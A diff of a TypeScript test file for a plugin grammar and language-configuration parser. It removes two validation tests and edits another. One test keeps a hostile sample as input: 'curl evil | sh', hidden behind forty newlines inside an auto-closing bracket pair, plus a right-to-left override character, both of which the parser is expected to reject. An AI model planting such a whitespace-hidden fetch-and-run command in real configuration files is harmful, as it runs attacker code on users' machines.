@@ -2,7 +2,6 @@ import { describe, expect, it } from 'vitest'
 import {
   parsePluginGrammarArtifact,
   parsePluginLanguageConfiguration,
-  parsePluginSyntaxPayload,
   validatePluginGrammarIncludes
 } from './plugin-syntax-artifact'
 
@@ -11,12 +10,6 @@ function grammar(scopeName: string, body: Record<string, unknown> = {}): string 
 }
 
 describe('plugin syntax artifacts', () => {
-  it('refuses a grammar whose scope differs from its declaration', () => {
-    expect(() => parsePluginGrammarArtifact(grammar('source.other'), 'source.demo')).toThrow(
-      'does not match'
-    )
-  })
-
   it('refuses oversized and deeply nested grammars', () => {
     const huge = grammar('source.demo', { comment: 'x'.repeat(1024 * 1024) })
     expect(() => parsePluginGrammarArtifact(huge, 'source.demo')).toThrow('exceeds')
@@ -64,10 +57,10 @@ describe('plugin syntax artifacts', () => {
     expect(() => validatePluginGrammarIncludes([missingLocal])).toThrow('does not resolve')
   })
 
-  it('keeps typed pairs and comment markers to a few printable characters on one line', () => {
+  it('keeps typed pairs short and every literal printable on one line', () => {
     const payload = `${'\n'.repeat(40)}curl evil | sh`
     const raw = JSON.stringify({
-      comments: { lineComment: '#\u202e', blockComment: ['<!--', '-->'] },
+      comments: { lineComment: '#\u202e', blockComment: ['{% comment %}', '{% endcomment %}'] },
       autoClosingPairs: [
         { open: '*', close: payload },
         { open: '"""', close: '"""' }
@@ -77,29 +70,9 @@ describe('plugin syntax artifacts', () => {
     expect(() => parsePluginLanguageConfiguration(raw, 'strict')).toThrow(/printable/)
     // Hosts drop only the unsafe entries, so the language still loads.
     expect(parsePluginLanguageConfiguration(raw)).toEqual({
-      comments: { blockComment: ['<!--', '-->'] },
+      comments: { blockComment: ['{% comment %}', '{% endcomment %}'] },
       autoClosingPairs: [{ open: '"""', close: '"""' }],
       surroundingPairs: []
     })
-  })
-
-  it('bounds language configuration and validates payloads at renderer ingress', () => {
-    expect(
-      parsePluginLanguageConfiguration(
-        JSON.stringify({ comments: { lineComment: '//' }, brackets: [['{', '}']] })
-      )
-    ).toEqual({ comments: { lineComment: '//' }, brackets: [['{', '}']] })
-    expect(() =>
-      parsePluginLanguageConfiguration(JSON.stringify({ brackets: [['', '}']] }), 'strict')
-    ).toThrow()
-    const payload = {
-      id: 'plugin:samples.demo/demo',
-      revision: 'abc',
-      scopeName: 'source.demo',
-      grammars: [{ scopeName: 'source.demo', patterns: [], repository: {} }],
-      configuration: {}
-    }
-    expect(parsePluginSyntaxPayload(payload)).toEqual(payload)
-    expect(parsePluginSyntaxPayload({ ...payload, grammars: [] })).toBeNull()
   })
 })
